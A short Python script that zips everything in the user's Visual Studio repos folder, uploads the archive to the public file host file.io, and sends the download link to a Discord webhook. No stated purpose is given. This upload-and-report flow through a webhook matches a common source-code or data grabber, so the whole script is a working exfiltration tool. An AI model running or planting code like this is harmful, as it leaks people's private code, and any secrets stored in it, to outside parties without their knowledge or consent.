import os
import zipfile
import requests
import json
from pathlib import Path

VS_REPO_DIRECTORY = str(Path.home() / "source" / "repos")
ZIP_FILENAME = "VS_Repos.zip"
DISCORD_WEBHOOK_URL = "your-discord-webhook-goes-here"  # replace this with your discord webhook URL

def zip_repositories(source_dir, output_filename):
    """Zips all files in the given source directory."""
    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, start=source_dir)
                zipf.write(file_path, arcname=arcname)
    print(f"Zipped repositories into {output_filename}")

def upload_to_fileio(file_path):
    """Uploads the file to File.io and returns the download link."""
    url = "https://file.io/"
    with open(file_path, 'rb') as file:
        response = requests.post(url, files={'file': file})
    response_data = response.json()
    if response_data.get("success"):
        return response_data["link"]
    else:
        raise Exception(f"Failed to upload to File.io: {response_data}")

def send_to_discord(webhook_url, message):
    """Sends a message to a Discord webhook."""
    payload = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    if response.status_code != 204:
        raise Exception(f"Failed to send message to Discord: {response.status_code}, {response.text}")

def main():
    zip_repositories(VS_REPO_DIRECTORY, ZIP_FILENAME)

    try:
        fileio_link = upload_to_fileio(ZIP_FILENAME)
        print(f"Uploaded to File.io: {fileio_link}")
    except Exception as e:
        print(f"Error uploading to File.io: {e}")
        return

    try:
        send_to_discord(DISCORD_WEBHOOK_URL, f"Here is the File.io link to the zipped VS repos: {fileio_link}")
        print("Sent link to Discord.")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

if __name__ == "__main__":
    main()
